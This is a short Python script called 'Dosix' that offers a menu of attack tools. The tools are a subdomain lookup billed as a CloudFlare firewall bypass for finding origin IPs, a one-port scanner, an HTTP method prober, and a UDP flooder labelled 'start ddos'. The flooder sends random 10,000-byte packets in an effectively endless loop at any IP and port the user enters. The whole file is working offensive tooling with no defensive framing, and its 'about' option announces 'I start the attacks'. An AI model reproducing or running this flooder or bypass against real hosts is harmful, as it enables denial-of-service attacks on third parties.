import pyfiglet
import socket
import sys
import socket, random, time
import requests
ascii_banner = pyfiglet.figlet_format("Dosix")
print(ascii_banner)
print ('chouse witch options do you want')
print('1:bypass firewall\n 2:port scanner \n 3::start ddos\n 4:scan website open methods\n 5:About developer and updates')
op=int(input('witch option do you want:'))
#bypass fierwall option 1
if op==1:
	def CloudFlare():
		try:
			subdom = ['ftp', 'cpanel', 'shop', 'api','mysql', 'secure', 'server','main','mail','index','localhost','register']
			URL = input("Please Enter Target url:")
			if URL == "":
				try:
					print("Please Enter Target url:)")
					sys.exit()
				except:
					return
			for sub in subdom:
				try:
					http = str(sub) + "." + str(URL)
					bypass = socket.gethostbyname(str(http))
					print(" [!] CloudFlare Bypass " + str(bypass) + ' | ' + str(http))
				except:
					pass
			try:
				input(" [*] Back To Menu (Press Enter...) ")
			except:
					print("")
					sys.exit()
		except:
			print("")





	CloudFlare()
#scan open ports of website
if op==2:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.settimeout(5)

	host = input("Please enter the IP you want to scan: ")
	port = int(input("Please enter the port you want to scan: "))


	def portScanner(port):
		if s.connect_ex((host, port)):
			print("The port is closed")
		else:
			print("The port is open")

	portScanner(port)
#start ddos attack option 3
elif op==3:
	s= socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

	ip = input("Enter target ip:")
	port = int (input("Enter target port to start ddos:"))
	s.connect((ip, port))

	print(random._urandom(10)*1000)

	for i in range(1, 100**1000):
		s.send(random._urandom(10)*1000)
		print (f"Send: {i}", end='/r')

elif op==4:

	url=input('inter target url:')
	method=['get','post','put','head','options','trace','connect','patch']
	for i in method:
		req=requests.request(i,'https://'+url)
	print(i,'',req.status_code)

elif op==5:
	print('This is a message to ali i start the attacks (((: ')

	

